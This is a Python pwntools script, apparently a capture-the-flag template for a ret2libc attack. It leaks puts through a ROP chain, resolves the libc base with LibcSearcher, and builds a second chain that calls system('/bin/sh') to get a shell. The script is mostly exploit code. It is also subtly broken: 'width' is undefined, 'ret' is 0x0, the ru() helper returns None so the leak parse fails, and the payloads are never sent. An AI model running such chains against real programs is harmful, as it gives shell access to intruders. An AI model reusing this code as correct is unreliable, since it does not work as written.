from pwn import *
from LibcSearcher import *


def ru(x): print(io.recvuntil(x))
def rl(): print(io.recvline())
def sla(x, y): print(io.sendlineafter(x, y))
def sl(x): print(io.sendline(x))
def psize(x): return p64(x)
# 1. ret
# 2. io payload


# io = remote('node4.buuoj.cn', 26624)
root = './'
io = process(root)
elf = ELF(root)

# ROPgadget --binary <elf> | grep "ret"
pop_rdi_ret = 0x400c83
ret = 0x0
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
next_func = elf.sym['main']

# io & payload
pass
payload = b''.ljust(width, b'*')
payload += psize(pop_rdi_ret)
payload += psize(puts_got)
payload += psize(puts_plt)
payload += psize(next_func)
pass

# get system
puts_addr = u64(ru(b'\n')[:-1].ljust(8, b'\0'))

obj = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - obj.dump('puts')  # libc_base_addr
system = libc_base+obj.dump('system')  # calc funcs addr
bins = libc_base+obj.dump('str_bin_sh')

# final io & payload
pass
payload = b''
payload += psize(ret)
payload += psize(pop_rdi_ret)
payload += psize(bins)
payload += psize(system)
pass
